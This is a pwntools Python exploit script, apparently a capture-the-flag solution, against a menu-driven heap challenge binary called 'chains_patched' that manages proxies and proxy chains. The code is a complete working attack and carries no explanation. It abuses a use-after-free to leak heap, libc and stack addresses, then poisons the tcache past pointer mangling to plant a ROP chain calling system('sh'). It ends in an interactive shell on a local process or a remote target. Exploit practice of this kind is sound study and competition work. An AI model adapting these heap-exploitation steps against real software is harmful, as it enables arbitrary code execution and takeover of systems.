#!/usr/bin/env python
from pwn import *
from time import sleep

context.binary = e = ELF("chains_patched")
libc = e.libc
gs = """
"""


def start():
    if args.LOCAL:
        p = e.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gs)
            pause()
    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


io = start()


def addProxy(hostname: bytes, port: int) -> int:
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"[?] Enter proxy hostname: ", hostname)
    io.sendlineafter(b'[?] Enter proxy port: ', str(port).encode())
    io.recvuntil(b'[+] Proxy with id #')
    return int(io.recvuntil(b' ').decode())


def delProxy(id: int):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b'[?] Enter proxy id: ', str(id).encode())


def addChain(size: int, proxies: list) -> int:
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b'[?] Enter chain size: ', str(size).encode())
    for i in range(size):
        io.sendlineafter(b'proxy id: ', str(proxies[i]).encode())
    io.recvuntil(b'[+] Chain with id #')
    return int(io.recvuntil(b' ').decode())


def viewChain(id: int):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b'[?] Enter chain id: ', str(id).encode())


def delChain(id: int):
    io.sendlineafter(b"> ", b"5")
    io.sendlineafter(b'[?] Enter chain id: ', str(id).encode())


for i in range(20):
    if i == 5:
        addProxy(b'F'*0x60+p64(0)+p64(0xa91), 0x1337+i)

    elif i == 8:
        addProxy(b'I'*0x10+p64(0)+p64(0x91)+p64(0)*2, 0x1337+i)

    else:
        addProxy(p8(0x41+i)*0x10, 0x1337+i)


chain0 = addChain(2, [0, 1])

delProxy(0)
chain1 = addChain(1, [1])
viewChain(chain0)

io.recvuntil(b'[*] proxy #0 is ')
heap = u64(io.recv(6)+b'\0\0') - 0x370
log.success(hex(heap))

delChain(chain1)
chain1 = addChain(2, [2, 3])

delProxy(1)
chain2 = addChain(1, [4,])

delChain(chain1)
addProxy(p64(heap+0x6a0)+p16(0x1337)+b'\0', 0)

for i in range(4):
    addProxy(b'A', 1)

leaker = addChain(1, [6])
delChain(chain2)

addProxy(b'pad', 0)
abr = addProxy(p64(heap+0x750)+p64(1), 0x1111)

viewChain(leaker)
io.recvuntil(b'[*] proxy #0 is ')
libc.address = u64(io.recv(6)+b'\0\0') - (libc.sym.main_arena+96)
log.success(hex(libc.address))

delProxy(abr)
abr = addProxy(p64(libc.sym.environ)+p64(1), 0x1111)

viewChain(leaker)
io.recvuntil(b'[*] proxy #0 is ')
stack = u64(io.recv(6)+b'\0\0') - 0x130
log.success(hex(stack))


delProxy(abr)
abr = addProxy(p64(heap+0x860)+p64(0), 0x1111)

delProxy(10)
delProxy(11)

delChain(leaker)
delProxy(8)

target = heap+0x860
addProxy(p64(0)*2 + p64(0)+p64(0x91) +
         p64((target >> 12) ^ (stack-8)) + p64(0), 12)

for i in range(2):
    addProxy(b'A', 1)

addProxy(p64(0)+p64(libc.address+0x000000000010f75b) +
         p64(next(libc.search(b'sh\0'))) + p64(libc.address+0x000000000010f75c) + p64(libc.sym.system), 1)

io.sendlineafter(b"> ", b"6")

io.interactive()
